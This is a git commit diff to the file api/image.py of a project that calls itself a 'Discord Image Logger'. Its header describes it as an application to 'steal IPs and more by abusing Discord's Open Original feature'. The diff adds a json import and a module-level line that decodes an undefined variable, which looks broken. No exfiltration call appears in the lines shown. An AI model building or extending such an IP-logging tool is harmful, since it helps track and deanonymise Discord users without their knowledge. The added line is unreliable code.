a818593a696155b9f25a2c55758e20db8406181a
yaroikio23-star <yaroikio23@gmail.com>
2026-03-01 02:29:17 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -4,6 +4,8 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
+import json
+data = json.loads(data.decode())
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
